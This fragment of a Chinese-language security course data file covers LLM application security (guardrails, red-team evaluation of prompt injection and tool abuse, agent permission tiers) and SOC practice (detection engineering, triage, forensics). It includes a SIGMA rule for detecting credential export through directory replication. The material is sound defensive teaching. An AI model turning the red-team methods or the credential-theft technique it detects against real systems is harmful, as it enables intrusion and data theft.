            "高级": "深入：按数据等级决定可用模型（高敏走私有部署）、在网关层做强制脱敏与审计、并把「发送内容」纳入数据出境与合规评估范围。",
          },
          codeLang: "text",
          code:
`提示词数据自查
□ 是否包含身份证/手机号/地址等个人信息？
□ 是否包含密钥、内部地址、未公开业务数据？
□ 能否用占位符或脱敏值替代真实数据？
□ 供应商是否承诺不留存、不用于训练？是否有协议？`,
          tool: "网关脱敏、模型选型策略、DPA",
          refs: "个人信息保护法；供应商条款"
        },
        {
          id: "aisec-defense", name: "分层防护与护栏设计", level: "中级",
          summary: "没有单点银弹：输入过滤、权限收敛、输出校验、人在回路与监控要叠起来用。",
          keywords: ["护栏","分层防护","输入过滤","输出校验","人在回路","监控"],
          levels: {
            "入门": "防 AI 出错要像防贼一样装好几道门：门口看一遍、里面锁起来、出门再检查一遍，重要的还要人点确认。",
            "初级": "四层：输入层（限长、检测注入特征、拒绝明显越权意图）、能力层（工具白名单与最小权限）、输出层（敏感信息过滤、结构校验）、流程层（高风险动作人工确认）。",
            "中级": "实战：先做「影响面优先」——把有副作用的动作全部收紧（确认+审计+限额），再优化提示词与检测规则；护栏要可度量（拦截率、误拦率、漏拦样本）。",
            "高级": "深入：护栏本身要能被评估与回归（红队样本集 + 上线前回归），并把 LLM 应用纳入既有安全体系（日志、SIEM、应急、变更管理），而不是独立小系统。",
          },
          codeLang: "text",
          code:
`四层护栏（按代价从低到高）
1) 输入：限长、拒绝明显越权、标注不可信内容
2) 能力：工具白名单、参数校验、限额与幂等
3) 输出：脱敏、结构校验、拒绝危险渲染
4) 流程：高危动作人工确认、全量审计、异常告警`,
          tool: "护栏框架、API 网关、SIEM",
          refs: "OWASP LLM 缓解措施；防纵深"
        },
        {
          id: "aisec-eval", name: "LLM 应用红队评估方法", level: "高级",
          summary: "评估要覆盖注入、越权、数据泄露与工具滥用，并给出可复现证据与影响判定。",
          keywords: ["红队","评估","测试集","复现","影响判定","回归"],
          levels: {
            "入门": "像给普通系统做安全测试一样，只是要专门测「用话能不能骗过 AI」。",
            "初级": "评估维度：提示注入（直接/间接）、越权检索与数据泄露、工具滥用与副作用、输出处理漏洞、隐私与合规。每项都要有可复现的最小样例。",
            "中级": "实战：自建样本集（按风险分级），从「最坏后果」反推测试路径（能否发出邮件、能否读到别人的数据）；记录拦截点与绕过点，形成修复优先级。",
            "高级": "深入：把样本集变成回归资产（每次改提示词/模型版本都跑一遍），并跟踪指标趋势（漏拦率、工具确认覆盖率）；评估结论要能落到工程项而非仅报告描述。",
          },
          codeLang: "text",
          code:
`评估产出模板
· 测试项 / 最小复现步骤 / 实际结果 / 期望结果
· 影响：只读泄露 / 越权写入 / 外发 / 破坏
· 根因：输入未隔离 / 权限过大 / 输出未校验
· 修复：具体到配置或代码位置 + 回归用例`,
          tool: "红队样本集、回归脚本",
          refs: "LLM 红队指南；OWASP LLM Top 10"
        },
        {
          id: "aisec-cost-dos", name: "资源滥用与成本攻击", level: "中级",
          summary: "LLM 应用的「拒绝服务」常表现为账单飙升：超长输入、无限循环调用与工具递归。",
          keywords: ["成本攻击","拒绝服务","限流","配额","循环","token"],
          levels: {
            "入门": "AI 每次回答都要花钱。有人故意发超长内容或让程序反复调用，账单就会暴涨。",
            "初级": "风险点：超长输入放大 token 消耗、Agent 工具递归导致无限调用、公开接口被脚本刷、以及大文件/多图上传带来的推理成本。",
            "中级": "实战：入口限长限频（按用户/租户配额）、工具循环设轮次上限与去重、对高成本模型设降级策略、并对异常用量告警。",
            "高级": "深入：把成本当安全指标管理——预算熔断、按租户计费与配额、异常模式检测（同一输入高频重放），并做「失控自动化」演练（如 Agent 陷入循环）。",
          },
          codeLang: "text",
          code:
`成本防护最小配置
· 单次输入长度上限 + 单用户每分钟请求上限
· Agent 工具循环：轮次上限 + 相同调用去重
· 高成本模型仅对内开放，外部走小模型
· 日预算熔断 + 异常用量告警`,
          tool: "网关限流、配额系统、用量监控",
          refs: "LLM 应用运维实践"
        },
        {
          id: "aisec-governance", name: "AI 治理与审计", level: "入门",
          summary: "谁改提示词、模型版本怎么发布、出问题谁负责——治理决定 AI 应用能不能长期安全运行。",
          keywords: ["治理","审计","变更","责任人","模型版本","留痕"],
          levels: {
            "入门": "AI 应用的规则（提示词、工具权限）会被人改。要有记录、要有人负责，出了问题才查得清。",
            "初级": "治理要素：提示词与工具配置纳入版本管理、变更需评审与留痕、模型与依赖版本可追溯、以及明确责任人与应急联系人。",
            "中级": "实战：把「提示词变更」当代码变更对待（评审 + 测试 + 灰度），记录每次上线的模型版本与配置；对关键决策保留输入输出用于事后审计（注意隐私边界）。",
            "高级": "深入：治理要覆盖全生命周期与第三方（模型供应商、插件、外部工具），并把 AI 风险纳入企业风险管理与合规评估，形成可审计的证据链。",
          },
          codeLang: "text",
          code:
`变更留痕最小字段
· 变更内容（提示词/工具/模型版本）
· 提交人与评审人
· 回归测试结果（是否通过）
· 生效时间与回滚方式
· 影响范围（哪些用户/租户）`,
          tool: "版本管理、变更评审流程、审计日志",
          refs: "AI 治理框架；变更管理实践"
        },
        {
          id: "ai-how", name: "大模型是怎么工作的（够用版）", level: "入门",
          summary: "它在「猜下一个词」，靠上下文做推理；理解这一点就能理解它为什么会犯错、会被骗。",
          keywords: ["大模型","token","上下文","概率","幻觉","原理"],
          levels: {
            "入门": "大模型做的事情本质上是「根据前面的内容，猜下一个最可能的词」，一步接一步。所以它很会说话，但不保证说的都对。",
            "初级": "几个关键概念：token（文字被切成的小块）、上下文窗口（一次能看多少内容）、温度（随机性）。它没有「数据库」，回答来自学过的模式 + 你给的上下文。",
            "中级": "实战含义：① 事实性内容要核实（会「幻觉」）；② 上下文里给什么，它就更容易照着走（所以注入有效）；③ 相同问题可能不同答案，涉及判定逻辑要靠外部校验。",
            "高级": "深入：理解「指令与数据同通道」是 LLM 安全所有问题的根源，因此防护重心在结构（权限、隔离、校验）而非提示词技巧。",
          },
          codeLang: "text",
          code:
`够用版心智模型
输入文本 → 切成 token → 模型按概率逐个生成下一个 token → 拼成回答
推论：① 会编（幻觉）→ 要核实
      ② 上下文即指令 → 会被注入牵引
      ③ 输出不稳定 → 判定逻辑放外部`,
          tool: "模型文档、在线 demo",
          refs: "大模型基础；OWASP LLM Top 10"
        },
        {
          id: "ai-usage", name: "用 AI 时要注意什么", level: "入门",
          summary: "别把机密贴进去、别把输出当真、别让它直接动重要系统。",
          keywords: ["ai 使用","隐私","核实","权限","安全习惯"],
          levels: {
            "入门": "三个习惯：不贴敏感信息（客户资料、密钥）、重要结论要核实、别让 AI 直接操作重要系统。",
            "初级": "具体风险：数据离开你的系统（隐私与合规）、回答可能有错（幻觉）、生成的代码可能带漏洞或引入不合规依赖、以及被诱导做越权动作（Agent 场景）。",
            "中级": "实战：用占位符替代真实数据、把 AI 生成代码当「未审核的第三方代码」处理（评审 + 扫描）、对能调用工具的 Agent 限制权限并要求确认。",
            "高级": "深入：企业侧要明确「哪些数据可以用哪个模型」的分级策略，并把 AI 使用纳入既有安全与合规流程（日志、审计、变更）。",
          },
          codeLang: "text",
          code:
`AI 使用安全习惯
· 数据：用占位符，不贴真实客户信息与密钥
· 输出：当草稿，关键结论二次核实
· 代码：当外部代码审（依赖 + 安全扫描）
· 动作：涉及发送/删除/支付必须人工确认`,
          tool: "脱敏习惯、AI 使用规范",
          refs: "AI 使用安全实践"
        },
        {
          id: "ai-prompt-eng", name: "提示词工程与安全边界", level: "中级",
          summary: "提示词能改善效果，但不该承担安全职责；安全要靠结构、权限与校验。",
          keywords: ["提示词","系统提示","边界","防御","职责划分"],
          levels: {
            "入门": "把提示词写清楚能提升效果（角色、约束、输出格式）。但要明白：提示词是「建议」，不是「规则」，不能当安全防线。",
            "初级": "常见做法：系统提示里写明职责与禁止事项、要求结构化输出、提供示例（few-shot）；这些能减少错误但不能阻止恶意绕过。",
            "中级": "实战：把安全要求从提示词下沉到代码——权限校验、工具白名单、输出编码、敏感信息过滤，提示词只做体验优化。",
            "高级": "深入：提示词与工具配置要版本化并可回归；用红队样本集验证每次调整是否引入退化，避免「改一句话导致防线失效」。",
          },
          codeLang: "text",
          code:
`分工原则
提示词负责：角色设定、表达风格、输出格式、示例
代码负责：权限校验、工具白名单、参数校验、输出编码、敏感信息过滤
判断标准：把提示词整段删掉，系统是否仍然安全？（应该仍然安全）`,
          tool: "提示词版本管理、护栏组件",
          refs: "LLM 应用安全设计"
        },
        {
          id: "ai-monitor", name: "AI 应用的运行监控与审计", level: "中级",
          summary: "要能回答「谁在什么时候问了什么、模型做了什么动作」，否则出事无法追溯。",
          keywords: ["监控","审计","留痕","用量","异常","追溯"],
          levels: {
            "入门": "AI 系统也要留记录：谁问了什么、模型调用了哪些工具、花了多少钱。出事时这些是唯一线索。",
            "初级": "记录内容：请求者身份、输入摘要、模型与版本、调用的工具与参数、输出摘要、耗时与成本；注意隐私脱敏与留存期限。",
            "中级": "实战：为异常设告警——提示注入特征命中、工具调用被拒次数突增、单用户用量异常、输出包含敏感信息被过滤等。",
            "高级": "深入：把 AI 审计接入 SIEM 与既有应急流程；对高风险动作的记录要完整到可复盘（谁批准、模型建议是什么、最终执行了什么）。",
          },
          codeLang: "text",
          code:
`AI 审计日志最小字段
who（用户/租户）· when · model+version
input_summary（脱敏）· tool_calls（名称/参数/结果）
output_summary · tokens/cost · 是否触发护栏与人工确认`,
          tool: "日志平台、护栏组件、SIEM",
          refs: "LLM 可观测性实践"
        },
        {
          id: "ai-rag-eng", name: "RAG 安全工程实践", level: "中级",
          summary: "把检索增强当不可信输入源来建设：入库受控、检索按权限过滤、回答可溯源核对。",
          keywords: ["rag","工程实践","入库审核","权限过滤","溯源"],
          levels: {
            "入门": "检索增强就是让模型先查资料再回答。工程上要管三件事：谁能把资料放进去、查出来的是不是你有权看的、答案能不能点回原文核对。",
            "初级": "三处控制：入库（审核 + 权限 + 版本）、检索（强制按用户或租户过滤，并把结果标注为「数据」）、输出（附引用、过滤敏感信息）。",
            "中级": "实战：检索内容不要以指令形式拼接给模型（用明确分隔与角色标注，降低被当作指令的概率）；对高价值结论要求双源印证或人工复核。",
            "高级": "深入：监控异常入库（来源突变、批量新增）、定期抽检引用准确性；把检索与回答日志接入安全运营，才能发现投毒与越权检索。",
          },
          codeLang: "text",
          code:
`RAG 工程控制清单
入库：审核 + 写入权限 + 版本留痕
检索：强制权限/租户过滤；结果标注为数据而非指令
输出：带引用可溯源；敏感信息二次过滤
运营：异常入库告警 + 引用准确性抽检
`,
          tool: "向量库权限、审核流、引用溯源",
          refs: "RAG 安全工程实践"
        },
        {
          id: "ai-agent-guard", name: "Agent 护栏工程实现", level: "高级",
          summary: "护栏要落到代码：工具白名单、参数校验、限额幂等、人工确认与全量审计，缺一不可。",
          keywords: ["agent","护栏","工具白名单","限额","确认","审计"],
          levels: {
            "入门": "想让 AI 助手不乱来，光靠提示词不够——得在代码里限制它「能用哪些工具、能传什么参数、能做多少次」。",
            "初级": "四道闸：工具白名单（只允许必要工具）、参数校验（格式与取值范围）、限额与幂等（防重复执行）、高危动作人工确认。",
            "中级": "实战：把有副作用的动作按等级标注（只读 / 写入 / 外发 / 破坏），外发与破坏类强制确认；所有调用记入审计（谁批准、模型建议什么、实际执行什么）。",
            "高级": "深入：护栏要可度量与可回归（红队样本 + 拦截率 + 漏拦率）；同时防止「护栏本身被绕过」——确认逻辑必须在服务端，不能由模型判断是否需要确认。",
          },
          codeLang: "text",
          code:
`工具权限四级（示例）
只读：直接执行
写入：参数校验 + 审计
外发：白名单（收件人/域名）+ 确认
破坏：人工确认 + 双人复核
原则：是否需要确认由代码决定，不由模型决定
`,
          tool: "工具网关、确认交互、审计日志",
          refs: "Agent 安全工程实践"
        },
        {
          id: "ai-label", name: "AI 生成内容标识与合规", level: "初级",
          summary: "对外发布的 AI 内容要可识别来源：标识、留痕与责任归属是合规与信任的基础。",
          keywords: ["标识","水印","来源标注","合规","责任"],
          levels: {
            "入门": "AI 生成的内容对外发布时，别人有权知道这是 AI 做的——所以要打标识，别让人误以为是人工原创。",
            "初级": "做法：显式标识（标注由 AI 生成或辅助）、隐式水印（便于溯源）、保留生成记录（模型、时间、提示概要）。",
            "中级": "实战：涉及对外宣传、报告、客服话术时要有审核环节；标识与审核责任落实到人，避免「AI 说的」成为免责借口。",
            "高级": "深入：不同地区与平台对标识有具体要求（深度合成、生成式服务），需按适用规则设计，并把标识纳入发布流程门禁。",
          },
          codeLang: "text",
          code:
`发布前检查
□ 是否标注 AI 生成/辅助？
□ 是否保留生成记录（模型/时间/提示概要）？
□ 是否经过人工审核与责任人确认？
□ 是否符合平台与地区的标识要求？
`,
          tool: "标识规范、水印工具、发布流程",
          refs: "生成式 AI 内容标识要求"
        },
      ]
    },
    /* ---------------- 威胁情报与 SOC ---------------- */
    {
      id: "soccti", name: "威胁情报与 SOC", icon: "🧭",
      desc: "从情报分层与 IOC/TTP、检测工程与研判、威胁狩猎到取证与应急流程，覆盖安全运营的完整闭环。",
      topics: [
        {
          id: "soc-basics", name: "威胁情报基础与分类", level: "入门",
          summary: "威胁情报是把外部信息变成可决策的输入；分战略、运营、战术三层，用途完全不同。",
          keywords: ["威胁情报","战略","运营","战术","cti","决策"],
          levels: {
            "入门": "威胁情报就是「关于坏人的情报」：谁在攻击、用什么手法、有没有盯上我们。有了它，防御才知道该防谁。",
            "初级": "三层：战略情报（趋势与风险，给管理层）、运营情报（攻击活动与目标，给安全团队）、战术情报（IOC/TTP，给检测设备）。层级错配会导致「情报没人用」。",
            "中级": "实战：先明确消费方与决策场景（是排优先级、做检测规则，还是做应急支撑），再定情报需求与来源；否则收集一堆无人使用的报告。",
            "高级": "深入：情报价值在于「可执行 + 可验证」，要与自身资产与暴露面结合；建立评估机制（命中率、误报、节省的处置时间）而非只统计订阅数量。",
          },
          codeLang: "text",
          code:
`情报消费矩阵（谁用它做什么）
管理层：战略情报 → 风险预算、重点投入方向
安全运营：运营情报 → 值班重点、专项排查
检测工程：战术情报 → 规则与 IOC 落地
应急响应：全部 → 归因、范围界定、处置建议`,
          tool: "情报平台、订阅源、情报工单",
          refs: "CTI 实践；情报分层模型"
        },
        {
          id: "soc-ioc-ioa", name: "IOC 与 IOA / TTP", level: "初级",
          summary: "IOC 是「坏东西的指纹」（易过期），TTP 是「坏人的手法」（更难改），后者价值更高。",
          keywords: ["ioc","ioa","ttp","哈希","域名","行为"],
          levels: {
            "入门": "IOC 像通缉令上的照片（换个发型就失效），TTP 像作案手法（改起来难得多）。",
            "初级": "IOC 常见类型：文件哈希、域名/IP、URL、注册表键。IOA 关注行为：可疑进程链、异常外联、持久化动作。ATT&CK 是 TTP 的结构化表达。",
            "中级": "实战：IOC 用于快速匹配（检索日志、封禁），但要注意时效与误伤（共享 IP、CDN）；TTP 用于写检测规则与狩猎假设，效果更持久。",
            "高级": "深入：把 IOC 与 TTP 组合成检测体系——IOC 抓已知、TTP 抓变种；同时管理 IOC 生命周期（过期下架）与情报质量（来源可信度、上下文）。",
          },
          codeLang: "text",
          code:
`IOC 落地检查
· 是否带上下文（关联家族/活动、首次发现时间）？
· 是否评估误伤（共享基础设施、云服务 IP）？
· 是否有失效时间与下架流程？
· 是否同时给出对应 TTP 以便写行为规则？`,
          tool: "IOC 库、ATT&CK、检测平台",
          refs: "MITRE ATT&CK；CTI 实践"
        },
        {
          id: "soc-soc-ops", name: "SOC 运营与值班", level: "初级",
          summary: "SOC 的产能取决于流程与分级，不是工具多少；值班要有清晰的升级路径与交接机制。",
          keywords: ["soc","值班","分级","升级","交接","sla"],
          levels: {
            "入门": "SOC 就是安全监控室：盯着告警，判断哪些是真事，然后按流程处理或升级。",
            "初级": "运转要素：告警分级（P1-P4）、响应 SLA、升级路径（一线→二线→应急）、值班交接与复盘。缺流程会导致「告警看了但没闭环」。",
            "中级": "实战：优先治理高噪音规则（占告警量 80% 的几条），把重复处置固化成剧本（playbook），让一线有明确动作而不是靠经验。",
            "高级": "深入：用指标驱动改进（MTTD/MTTR、告警准确率、剧本覆盖率），并把典型事件转成检测规则与自动化动作，形成闭环。",
          },
          codeLang: "text",
          code:
`值班交接模板
· 未闭环告警（编号/等级/当前状态/下一步）
· 进行中的事件与联系人
· 已知噪音与临时抑制规则（何时到期）
· 本次班次新增情报与重点目标`,
          tool: "工单系统、SOAR、剧本库",
          refs: "SOC 运营实践"
        },
        {
          id: "soc-detection", name: "检测工程与规则编写", level: "中级",
          summary: "检测规则要写「可解释、可回归、可维护」；重点是覆盖 ATT&CK 关键手法而非堆规则数。",
          keywords: ["检测工程","规则","sigma","覆盖","回归","误报"],
          levels: {
            "入门": "检测规则就是「什么情况该报警」的定义。写得太松天天乱叫，写得太紧真出事也不响。",
            "初级": "思路：从 ATT&CK 选关键手法 → 找可用日志字段 → 写规则（SIGMA 等格式）→ 用真实数据回归（该报的报、不该报的不报）。",
            "中级": "实战：每条规则都要有测试样本与已知误报说明；上线前评估噪音量，上线后跟踪命中与处置结果，定期清理没人处理的规则。",
            "高级": "深入：做覆盖度管理（ATT&CK 覆盖率与缺口清单），把情报与事件复盘持续转化为规则，并用「检测即代码」的方式纳入版本管理与回归流水线。",
          },
          codeLang: "yaml",
          code:
`# SIGMA 规则骨架（示意）
title: 可疑的凭据导出行为
logsource: { product: windows, service: security }
detection:
  selection: { EventID: 4662, Properties: '*Replicating Directory Changes*' }
  condition: selection
level: high
# 上线前：跑历史数据看噪音；上线后：跟踪处置结论`,
          tool: "SIGMA、检测平台、覆盖度矩阵",
          refs: "检测工程实践；ATT&CK 覆盖"
        },
        {
          id: "soc-triage", name: "告警研判与分级", level: "中级",
          summary: "研判的目标是快速回答「是不是真事、影响多大、要不要升级」，而不是把告警看完。",
          keywords: ["研判","分级","误报","误拦","升级","证据"],
          levels: {
            "入门": "看到告警先问三句：这是真的吗？影响谁？要不要马上找人？",
            "初级": "研判动作：核对上下文（账号、资产、时间、来源）→ 判断是否已知良性行为（变更、扫描器、备份）→ 决定关闭/继续观察/升级。",
            "中级": "实战：建立「快速判据」清单（哪些资产关键、哪些账号高权、哪些行为必然可疑），并与变更系统联动减少误报；结论要留下证据与理由供复核。",
            "高级": "深入：把重复研判固化成剧本与自动化富化（资产、情报、历史行为一次拉齐），让一线在 1 分钟内拿到决策所需上下文。",
          },
          codeLang: "text",
          code:
`研判四问（模板）
1) 资产：是核心资产/高权账号吗？
2) 行为：是否属于已知变更或工具行为？
3) 证据：有无成功迹象（回连、落地文件、数据外发）？
4) 结论：关闭（原因）/ 观察（条件）/ 升级（等级与通知对象）`,
          tool: "富化平台、资产库、工单",
          refs: "SOC 研判实践"
        },
        {
          id: "soc-hunting", name: "威胁狩猎", level: "高级",
          summary: "狩猎是从「假设攻击者已在内网」出发主动找证据，靠 TTP 假设与数据探索而非等告警。",
          keywords: ["威胁狩猎","假设","ttps","数据探索","证据","发现"],
          levels: {
            "入门": "等报警是被动的；狩猎是主动去查：如果坏人已经进来了，他会留下什么痕迹？",
            "初级": "流程：立假设（基于 ATT&CK 或情报）→ 找数据（哪些日志能验证）→ 查询与验证 → 得出结论并沉淀成规则或监控项。",
            "中级": "实战：从高价值风险入手（凭据滥用、横向移动、持久化），写出可复用的查询；找不到证据也是有价值结论（说明数据缺失），要补日志。",
            "高级": "深入：狩猎要工程化（查询库、周期化、与检测规则互补），并衡量产出（发现数量、转化为规则数、覆盖的 TTP）；数据质量决定狩猎上限。",
          },
          codeLang: "text",
          code:
`狩猎假设示例
假设：攻击者使用受感染的服务账号在内网横向。
需数据：认证日志（类型/来源/目标）、进程创建、远程服务调用。
查询方向：非工作时段、单账号多目标、失败后成功的模式。
产出：证据 / 缺口（缺什么日志）/ 新规则`,
          tool: "SIEM 查询、EDR 遥测、ATT&CK",
          refs: "威胁狩猎实践"
        },
        {
          id: "soc-ir-flow", name: "应急响应流程与角色", level: "中级",
          summary: "应急靠流程而不是英雄：准备、识别、遏制、根除、恢复、复盘六阶段，每阶段有明确产出。",
          keywords: ["应急响应","流程","遏制","根除","恢复","复盘"],
          levels: {
            "入门": "出事了怎么处理要事先说好：谁指挥、谁动手、先做什么。临时商量必然乱。",
            "初级": "六阶段：准备 → 识别 → 遏制 → 根除 → 恢复 → 复盘。关键角色：指挥、取证、系统处置、沟通（对内对外）。",
            "中级": "实战：遏制要平衡「止血」与「留证」（断网但保留内存与日志）；根除要确认入口与后门都清掉；恢复要验证可用与干净；复盘要落成控制项。",
            "高级": "深入：大型事件要做多线并行（取证/业务恢复/对外沟通）与时间线管理；预案要演练（桌面推演 + 实战演练），否则关键时刻找不到联系人。",
          },
          codeLang: "text",
          code:
`事件时间线（示例字段）
时刻 | 事件 | 证据来源 | 决策 | 决策人
T+0  | 收到告警 | SIEM | 启动识别 | 值班
T+20m| 确认真实攻击 | EDR 遥测 | 遏制受影响网段 | 指挥
T+2h | 定位入口 | 日志回溯 | 开始根除 | 处置组`,
          tool: "预案模板、取证工具、演练流程",
          refs: "NIST 800-61；应急响应实践"
        },
        {
          id: "soc-forensics", name: "主机与网络取证", level: "高级",
          summary: "取证的核心是「证据完整性」：先固定、再分析，所有操作可追溯。",
          keywords: ["取证","内存镜像","磁盘","取证链","时间线","证据完整性"],
          levels: {
            "入门": "取证就是收集「当时发生了什么」的证据，而且不能把证据弄坏。",
            "初级": "基本动作：内存镜像、磁盘镜像、关键日志导出；记录取证链（谁在什么时候做了什么、用什么哈希）。",
            "中级": "实战：主机侧看进程树、持久化项、计划任务、服务与登录记录；网络侧看连接与外联；用时间线把两者对齐还原攻击过程。",
            "高级": "深入：注意反取证（日志清理、时间戳篡改），多源交叉验证（EDR + 流量 + 认证日志）；结论要能经得起质证（证据可复现）。",
          },
          codeLang: "bash",
          code:
`# 取证优先动作（示意，需按预案与授权执行）
# 1) 内存优先（重启即丢失）
winpmem / dumpit / avml 等工具导出内存镜像
# 2) 计算哈希并记录取证链
sha256sum memory.raw > memory.raw.sha256
# 3) 再做磁盘与日志导出；尽量避免直接在被调查系统上操作`,
          tool: "内存/磁盘镜像工具、时间线工具、哈希校验",
          refs: "取证流程规范；证据完整性"
        },
        {
          id: "soc-mitre", name: "ATT&CK 框架应用", level: "初级",
          summary: "ATT&CK 把攻击手法结构化，用来对齐检测覆盖、情报与复盘语言。",
          keywords: ["mitre","attack","ttps","战术","技术","覆盖"],
          levels: {
            "入门": "ATT&CK 是一张「攻击者常用手法清单」，按阶段排列（从初始访问到影响）。看看自己防住了哪些、漏了哪些。",
            "初级": "用法：① 用技术编号标注情报与规则；② 对照清单找检测缺口；③ 复盘时定位攻击者用了哪些技术、我们哪一步没看到。",
            "中级": "实战：做覆盖矩阵（每项技术是否有规则、是否有日志、是否有处置动作），优先补「有日志无规则」和「有关键技术无日志」的缺口。",
            "高级": "深入：避免「覆盖率虚高」——规则存在不等于能检出变种；要用真实样本回归，并把覆盖度与演练结果结合评估。",
          },
          codeLang: "text",
          code:
`覆盖矩阵字段（示例）
技术编号 | 名称 | 有日志？ | 有规则？ | 最近验证结果 | 缺口动作
T1078    | 有效账号 | 是       | 是       | 检出（演练）   | 优化降噪
T1055    | 进程注入 | 部分     | 否       | 未验证         | 补遥测 + 规则`,
          tool: "ATT&CK Navigator、检测平台",
          refs: "MITRE ATT&CK"
        },
        {
          id: "soc-platform", name: "情报平台与订阅源管理", level: "中级",
          summary: "情报源不是越多越好：要评估可信度、时效与可执行性，并接入工作流才算落地。",
          keywords: ["情报平台","订阅源","可信度","时效","tip","落地"],
          levels: {
            "入门": "情报来源很多，有的准有的瞎猜。要知道哪些能信、哪些只是参考。",
            "初级": "管理维度：来源可信度、覆盖范围（区域/行业）、时效（是否实时）、格式（是否可机读）、以及许可与合规限制。",
            "中级": "实战：把情报接入工作流——自动富化告警、生成检测任务、更新封禁清单；同时记录使用效果（命中率），淘汰无效来源。",
            "高级": "深入：情报可信度评估要结合自身环境（同样的 IOC 在你的资产上是否常见），避免「拿来就封」造成业务误伤。",
          },
          codeLang: "text",
          code:
`情报源评估表
来源 | 可信度 | 覆盖 | 时效 | 机读 | 命中率 | 结论
A    | 高     | APT  | 日更 | 是   | 12%    | 保留并自动富化
B    | 中     | 通用 | 周更 | 否   | 1%     | 降级为参考`,
          tool: "TIP 平台、富化 API、封禁清单管理",
          refs: "CTI 平台实践"
        },
        {
          id: "soc-metrics", name: "安全运营指标与度量", level: "中级",
          summary: "指标用于改进而非汇报：MTTD/MTTR、告警准确率、剧本覆盖率、漏检复盘数。",
          keywords: ["指标","mttd","mttr","准确率","覆盖","度量"],
          levels: {
            "入门": "用数字看运营好不好：多久发现、多久处理完、多少告警是真事。",
            "初级": "常用指标：MTTD（发现时间）、MTTR（响应时间）、告警准确率、自动化处置占比、剧本覆盖率、以及漏检事件数。",
            "中级": "实战：指标要能驱动动作——准确率低就治理规则，MTTR 高就补自动化与预案；避免只看「告警关闭数量」这类无意义指标。",
            "高级": "深入：用少量核心指标 + 定期深度复盘（重大事件与漏检）代替报表堆砌；指标要与业务风险关联（关键资产覆盖优先）。",
          },
          codeLang: "text",
          code:
`核心指标（少而用）
· MTTD / MTTR：按事件等级统计，看趋势不看单点
· 告警准确率：真事/总告警，低于阈值先治规则
· 剧本覆盖率：高频场景是否有可执行剧本
· 漏检复盘：每起漏检是否转化为新规则或新日志`,
          tool: "SIEM 报表、工单统计、复盘模板",
          refs: "SOC 度量实践"
        },
        {
          id: "soc-attribution", name: "归因与对抗认知", level: "高级",
          summary: "归因是低置信度的推断，价值在于支撑决策（加防还是加侦测），而非「抓住是谁」。",
          keywords: ["归因","apt","traceability","置信度","对抗","决策"],
          levels: {
            "入门": "想知道是谁在攻击很难，攻击者也会故意留下假线索。所以归因结论要谨慎。",
            "初级": "归因依据：工具与基础设施特征、代码复用、时区与语言线索、行为习惯；单一证据不足以下结论，需要多源交叉。",
            "中级": "实战：给归因标注置信度（高/中/低）与依据，明确「这个判断会改变我们什么动作」（加固方向、监控重点、情报订阅）。",
            "高级": "深入：警惕对手的假旗（false flag）与工具买卖导致的误判；归因要服务于防御决策与对外沟通策略，不能作为唯一行动依据。",
          },
          codeLang: "text",
          code:
`归因结论模板
结论：疑似活动 X（置信度：中）
依据：基础设施重叠 / 工具特征 / 行为模式（逐条列出）
反证：是否存在假旗可能？
影响：据此调整的防御动作（优先监控目标与技术）`,
          tool: "情报关联分析、沙箱、代码相似度",
          refs: "归因实践；假旗风险"
        },
        {
          id: "soc-baseline", name: "日志与基线建设", level: "入门",
          summary: "检测能力的地基是日志：先解决「有没有、全不全、留多久」，再谈规则与自动化。",
          keywords: ["日志","采集","基线","保留","时间同步","数据质量"],
          levels: {
            "入门": "没有记录就查不到。先把关键系统的日志收起来、存够时间。",
            "初级": "优先接入：认证与域控、边界设备、关键服务器与数据库、终端 EDR、以及云操作审计。注意时间同步（否则时间线对不上）。",
            "中级": "实战：看数据质量而非数量——字段是否完整（来源 IP、账号、结果）、是否会被截断、保留期是否满足复盘需求；对关键资产建立正常行为基线。",
            "高级": "深入：日志本身是攻击目标（清理日志是常见反取证），要做集中化 + 只追加 + 权限隔离 + 完整性校验，并覆盖云与容器等新数据源。",
          },
          codeLang: "text",
          code:
`日志接入优先级（示例）
P0：认证/域控、边界（FW/VPN）、关键服务器
P1：EDR 遥测、云操作审计、数据库审计
P2：应用日志、容器与编排平台审计
基线：为关键资产记录「正常工作时段与访问模式」，偏离即告警`,
          tool: "日志平台、时间同步（NTP）、完整性校验",
          refs: "日志管理实践；NIST 日志指南"
        },
        {
          id: "soc-team", name: "安全团队都在干什么", level: "入门",
          summary: "防守、检测、响应、合规与安全建设：安全不是一个人的活，也不只是装设备。",
          keywords: ["安全团队","职责","防守","建设","合规","分工"],
          levels: {
            "入门": "安全团队主要做四件事：把该防的防住（加固与基线）、把该发现的发现（监控与检测）、出事时处置（应急）、以及让制度与合规落地。",
            "初级": "常见分工：安全运营（值班与研判）、检测工程（规则与数据）、应急响应、安全建设（架构与基线）、合规与审计。小团队常常一人多岗。",
            "中级": "实战：分工会带来接口问题（谁负责发现、谁负责处置），所以要有明确的告警归属与升级路径；否则「都以为别人在看」。",
            "高级": "深入：安全能力成熟的标志是「可度量 + 可演练」——有指标、有演练、有复盘闭环，而不是买了多少设备。",
          },
          codeLang: "text",
          code:
`团队协作的常见断点
· 告警没人认领 → 明确归属与交接
· 处置靠个人经验 → 固化成剧本
· 复盘只有结论 → 转成规则与监控项
· 与业务对立 → 提前对齐目标与优先级`,
          tool: "职责矩阵、预案、指标看板",
          refs: "安全组织与运营"
        },
        {
          id: "soc-alert", name: "收到一条告警之后", level: "入门",
          summary: "先判断真假与影响，再决定关闭、观察还是升级；结论要有理由与证据。",
          keywords: ["告警","研判","分级","升级","处置","记录"],
          levels: {
            "入门": "收到告警别急着下结论，先问三件事：这是真的吗？影响哪个系统/账号？要不要马上叫人？",
            "初级": "判断依据：资产重要性（核心资产 vs 测试机）、账号权限（普通用户 vs 管理员）、行为是否可解释（变更、扫描、备份）。结论要写清理由。",
            "中级": "实战：优先处理「高权账号 + 核心资产 + 有成功迹象」的组合；对拿不准的不要直接关闭，标记观察并设置复查条件。",
            "高级": "深入：把重复出现的告警做成剧本与自动化富化，减少人工判断成本；同时定期回头看「被关闭的告警里有没有漏掉的真事」。",
          },
          codeLang: "text",
          code:
`处置记录模板
告警：xxx  | 资产：web01（核心）
行为：管理员账号异地登录成功
判断：需升级（高权 + 核心 + 成功）
动作：隔离会话 → 通知负责人 → 启动核查
结论：真实事件 / 误报（原因）`,
          tool: "工单系统、SIEM、剧本库",
          refs: "告警研判实践"
        },
        {
          id: "soc-tabletop", name: "桌面推演与红蓝对抗", level: "高级",
          summary: "用讨论式演练检验预案：把「谁在什么时候做什么」走一遍，暴露流程与联系人缺口。",
